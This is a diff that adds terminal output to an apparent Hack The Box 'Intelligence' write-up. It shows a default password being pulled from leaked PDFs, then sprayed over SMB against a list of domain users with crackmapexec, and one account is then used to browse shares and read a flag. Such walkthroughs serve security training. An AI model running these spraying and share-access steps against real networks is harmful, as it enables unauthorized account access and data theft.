@@ -131,6 +131,128 @@ done
 ```
 
 
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
+└─# pdfgrep 'pass' *.pdf                                                                                        127 ⨯
+2020-06-04-upload.pdf:Please login using your username and the default password of:
+2020-06-04-upload.pdf:After logging in please change your password as soon as possible.
+```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
+└─# crackmapexec smb intelligence.htb -u users.txt -p 'NewIntelligenceCorpUser9876' --shares 
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing LDAP protocol database
+[*] Initializing SSH protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing SMB protocol database
+[*] Initializing WINRM protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+SMB         10.10.10.248    445    DC               [+] Enumerated shares
+SMB         10.10.10.248    445    DC               Share           Permissions     Remark
+SMB         10.10.10.248    445    DC               -----           -----------     ------
+SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.248    445    DC               C$                              Default share
+SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
+SMB         10.10.10.248    445    DC               IT              READ            
+SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.10.248    445    DC               Users           READ            
+                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
+└─# smbclient \\\\intelligence.htb\\Users -U Tiffany.Molina
+Enter WORKGROUP\Tiffany.Molina's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sun Apr 18 21:20:26 2021
+  ..                                 DR        0  Sun Apr 18 21:20:26 2021
+  Administrator                       D        0  Sun Apr 18 20:18:39 2021
+  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
+  Default                           DHR        0  Sun Apr 18 22:17:40 2021
+  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
+  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
+  Public                             DR        0  Sun Apr 18 20:18:39 2021
+  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
+  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021
+
+		3770367 blocks of size 4096. 1462812 blocks available
+smb: \> cd Tiffany.Molina
+smb: \Tiffany.Molina\> ls
+  .                                   D        0  Sun Apr 18 20:51:46 2021
+  ..                                  D        0  Sun Apr 18 20:51:46 2021
+  AppData                            DH        0  Sun Apr 18 20:51:46 2021
+  Application Data                DHSrn        0  Sun Apr 18 20:51:46 2021
+  Cookies                         DHSrn        0  Sun Apr 18 20:51:46 2021
+  Desktop                            DR        0  Sun Apr 18 20:51:46 2021
+  Documents                          DR        0  Sun Apr 18 20:51:46 2021
+  Downloads                          DR        0  Sat Sep 15 03:12:33 2018
+  Favorites                          DR        0  Sat Sep 15 03:12:33 2018
+  Links                              DR        0  Sat Sep 15 03:12:33 2018
+  Local Settings                  DHSrn        0  Sun Apr 18 20:51:46 2021
+  Music                              DR        0  Sat Sep 15 03:12:33 2018
+  My Documents                    DHSrn        0  Sun Apr 18 20:51:46 2021
+  NetHood                         DHSrn        0  Sun Apr 18 20:51:46 2021
+  NTUSER.DAT                        AHn   131072  Wed Oct 27 06:13:31 2021
+  ntuser.dat.LOG1                   AHS    86016  Sun Apr 18 20:51:46 2021
+  ntuser.dat.LOG2                   AHS        0  Sun Apr 18 20:51:46 2021
+  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf    AHS    65536  Sun Apr 18 20:51:46 2021
+  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
+  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Apr 18 20:51:46 2021
+  ntuser.ini                        AHS       20  Sun Apr 18 20:51:46 2021
+  Pictures                           DR        0  Sat Sep 15 03:12:33 2018
+  Recent                          DHSrn        0  Sun Apr 18 20:51:46 2021
+  Saved Games                         D        0  Sat Sep 15 03:12:33 2018
+  SendTo                          DHSrn        0  Sun Apr 18 20:51:46 2021
+  Start Menu                      DHSrn        0  Sun Apr 18 20:51:46 2021
+  Templates                       DHSrn        0  Sun Apr 18 20:51:46 2021
+  Videos                             DR        0  Sat Sep 15 03:12:33 2018
+
+		3770367 blocks of size 4096. 1462812 blocks available
+smb: \Tiffany.Molina\> cd Desktop
+smb: \Tiffany.Molina\Desktop\> ls
+  .                                  DR        0  Sun Apr 18 20:51:46 2021
+  ..                                 DR        0  Sun Apr 18 20:51:46 2021
+  user.txt                           AR       34  Wed Oct 27 06:04:01 2021
+
+		3770367 blocks of size 4096. 1462812 blocks available
+smb: \Tiffany.Molina\Desktop\> cat user.txt
+cat: command not found
+smb: \Tiffany.Molina\Desktop\> more user.txt
+getting file \Tiffany.Molina\Desktop\user.txt of size 34 as /tmp/smbmore.nA33pC (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \Tiffany.Molina\Desktop\> 
+```
+
 ```bash
 ┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
 └─# bash gen_date.sh > dates.txt && cat dates.txt | while read line; do echo ${line}$string-upload.pdf; done > file_name.txt 
